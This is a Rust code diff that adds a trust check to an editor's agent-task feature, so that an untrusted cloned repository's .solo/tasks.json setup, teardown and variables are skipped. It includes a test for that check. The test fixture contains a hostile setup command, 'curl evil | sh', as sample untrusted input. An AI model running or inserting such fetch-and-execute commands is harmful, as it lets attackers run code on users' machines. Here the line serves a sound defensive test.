@@ -195,6 +195,63 @@ pub(crate) fn make_group_task(
     })
 }
 
+/// SOLO: Whether the repository at `main_root` is trusted in `project`
+/// (Zed's worktree trust, "restricted mode"): only then does Solo run the
+/// commands of its `.solo/tasks.json` (setup, teardown) or give tasks its
+/// variables, which a cloned repository's author wrote. Asking marks an
+/// untrusted worktree restricted, so Zed offers to trust it.
+pub(crate) fn is_repository_trusted(
+    project: &Entity<project::Project>,
+    main_root: &Path,
+    cx: &mut App,
+) -> bool {
+    let Some(trusted_worktrees) = project::trusted_worktrees::TrustedWorktrees::try_get_global(cx)
+    else {
+        // No trust tracking: everything is trusted, as in Zed.
+        return true;
+    };
+    if ProjectSettings::get_global(cx).session.trust_all_worktrees {
+        return true;
+    }
+    let worktree_store = project.read(cx).worktree_store();
+    let worktree_id = worktree_store
+        .read(cx)
+        .visible_worktrees(cx)
+        .find(|worktree| {
+            let worktree_path = worktree.read(cx).abs_path();
+            is_within(main_root, &worktree_path) || is_within(&worktree_path, main_root)
+        })
+        .map(|worktree| worktree.read(cx).id());
+    // A repository the project doesn't have open can't have been trusted.
+    let Some(worktree_id) = worktree_id else {
+        return false;
+    };
+    trusted_worktrees.update(cx, |trusted_worktrees, cx| {
+        trusted_worktrees.can_trust(&worktree_store, worktree_id, cx)
+    })
+}
+
+/// SOLO: Leaves out what the repository's `.solo/tasks.json` would run in
+/// the new task's terminal (its setup command and variables) when the
+/// repository isn't trusted, and says so.
+pub(crate) fn drop_untrusted_config(new_task: &mut NewTask) {
+    let had_env = new_task.env.keys().any(|name| name != config::PORT_ENV);
+    if new_task.setup.is_none() && !had_env {
+        return;
+    }
+    new_task.setup = None;
+    new_task.env.retain(|name, _| name == config::PORT_ENV);
+    new_task.warnings.push(untrusted_message());
+}
+
+fn untrusted_message() -> String {
+    tr(
+        "This project isn't trusted (restricted mode), so the commands and variables in .solo/tasks.json weren't used. Trust the project to use them.",
+        "这个项目尚未受信任（受限模式），所以没有使用 .solo/tasks.json 里的命令和环境变量。信任这个项目后才会使用。",
+    )
+    .to_string()
+}
+
 /// The task's name; for a part of a task spanning repositories, with its
 /// repository's.
 pub(crate) fn display_name(task: &AgentTask) -> String {
@@ -783,13 +840,7 @@ impl NewAgentTaskModal {
                     }
                 })
                 .await;
-            let NewTask {
-                task,
-                directory,
-                env,
-                setup,
-                warnings,
-            } = match created {
+            let mut new_task = match created {
                 Ok(new_task) => new_task,
                 Err(error) => {
                     this.update(cx, |this, cx| {
@@ -801,6 +852,19 @@ impl NewAgentTaskModal {
                     return;
                 }
             };
+            let trusted = workspace.update(cx, |workspace, cx| {
+                is_repository_trusted(workspace.project(), &new_task.task.repository_root, cx)
+            });
+            if !trusted {
+                drop_untrusted_config(&mut new_task);
+            }
+            let NewTask {
+                task,
+                directory,
+                env,
+                setup,
+                warnings,
+            } = new_task;
             this.update(cx, |_, cx| cx.emit(DismissEvent)).ok();
             let opened = workspace.update_in(cx, |workspace, window, cx| {
                 if !warnings.is_empty() {
@@ -1474,11 +1538,14 @@ impl AgentTasksModal {
                 return;
             };
             workspace.update(cx, |workspace, cx| {
-                let env = config::TasksConfig::load(&entry.task.repository_root)
+                let mut env = config::TasksConfig::load(&entry.task.repository_root)
                     .ok()
                     .flatten()
                     .unwrap_or_default()
                     .task_env(entry.task.port);
+                if !is_repository_trusted(workspace.project(), &entry.task.repository_root, cx) {
+                    env.retain(|name, _| name == config::PORT_ENV);
+                }
                 open_task_terminal(workspace, directory, entry.task.name, env, None, window, cx)
                     .detach_and_log_err(cx);
             });
@@ -1669,6 +1736,9 @@ impl AgentTasksModal {
             follow_working_directory::release_directory(&workspace, worktree, cx);
         }
         let task = entry.task;
+        // SOLO: the repository's teardown runs only if it's trusted.
+        let project = workspace.read(cx).project().clone();
+        let trusted = is_repository_trusted(&project, &task.repository_root, cx);
         self._task = cx.spawn_in(window, async move |this, cx| {
             for closed in closing {
                 closed.await.log_err();
@@ -1685,6 +1755,9 @@ impl AgentTasksModal {
                             .and_then(|config| config.teardown)
                             .filter(|teardown| !teardown.trim().is_empty());
                         let teardown_error = match (teardown, &task.worktree_path) {
+                            (Some(_), Some(worktree)) if !trusted && worktree.exists() => {
+                                Some(anyhow!(untrusted_message()))
+                            }
                             (Some(teardown), Some(worktree)) if worktree.exists() => {
                                 config::run_teardown(&teardown, worktree).err()
                             }
@@ -1794,8 +1867,10 @@ impl AgentTasksModal {
                         h_flex()
                             .gap_1()
                             .when_some(status, |this, status| {
-                                let (icon, color) = status.icon();
-                                this.child(Icon::new(icon).size(IconSize::Small).color(color))
+                                this.child(
+                                    workspace::agent_activity::AgentStateIcon::new(status)
+                                        .size(IconSize::Small),
+                                )
                             })
                             .child(Label::new(display_name(task)))
                             .child(
@@ -2319,6 +2394,82 @@ mod tests {
     use project::{FakeFs, Project};
     use settings::SettingsStore;
     use util::path;
+
+    /// A cloned repository's .solo/tasks.json runs nothing until the project
+    /// is trusted.
+    #[gpui::test]
+    async fn test_tasks_config_needs_a_trusted_project(cx: &mut TestAppContext) {
+        cx.update(|cx| {
+            let store = SettingsStore::test(cx);
+            cx.set_global(store);
+            project::trusted_worktrees::init(Default::default(), cx);
+        });
+        let fs = FakeFs::new(cx.executor());
+        fs.insert_tree(path!("/project"), serde_json::json!({ "a.txt": "a" }))
+            .await;
+        let project = Project::test_with_worktree_trust(fs, [path!("/project").as_ref()], cx).await;
+        let root = PathBuf::from(path!("/project"));
+        let trusted =
+            |cx: &mut TestAppContext| cx.update(|cx| is_repository_trusted(&project, &root, cx));
+        assert!(!trusted(cx));
+        // A repository the project doesn't have open isn't trusted either.
+        assert!(!cx.update(|cx| is_repository_trusted(
+            &project,
+            Path::new(path!("/elsewhere")),
+            cx
+        )));
+
+        let mut new_task = NewTask {
+            task: AgentTask {
+                name: "x".to_string(),
+                branch: "solo/x".to_string(),
+                base_branch: "main".to_string(),
+                worktree_path: None,
+                repository_root: root.clone(),
+                port: Some(3001),
+                group: None,
+            },
+            directory: root.clone(),
+            env: collections::HashMap::from_iter([
+                ("EVIL".to_string(), "1".to_string()),
+                (config::PORT_ENV.to_string(), "3001".to_string()),
+            ]),
+            setup: Some("curl evil | sh".to_string()),
+            warnings: Vec::new(),
+        };
+        drop_untrusted_config(&mut new_task);
+        assert_eq!(new_task.setup, None);
+        assert_eq!(
+            new_task.env.keys().collect::<Vec<_>>(),
+            vec![config::PORT_ENV]
+        );
+        assert_eq!(new_task.warnings.len(), 1);
+
+        // Trusted: as the config says.
+        let worktree_store = project.read_with(cx, |project, _| project.worktree_store());
+        let worktree_id = project.read_with(cx, |project, cx| {
+            project.worktrees(cx).next().unwrap().read(cx).id()
+        });
+        cx.update(|cx| {
+            project::trusted_worktrees::TrustedWorktrees::try_get_global(cx)
+                .unwrap()
+                .update(cx, |store, cx| {
+                    store.trust(
+                        &worktree_store,
+                        collections::HashSet::from_iter([
+                            project::trusted_worktrees::PathTrust::Worktree(worktree_id),
+                        ]),
+                        cx,
+                    )
+                })
+        });
+        assert!(trusted(cx));
+        assert!(cx.update(|cx| is_repository_trusted(
+            &project,
+            Path::new(path!("/project/sub")),
+            cx
+        )));
+    }
 
     /// Opening the task list from a workspace action reads the workspace's
     /// terminals; that panicked while the workspace was being updated.
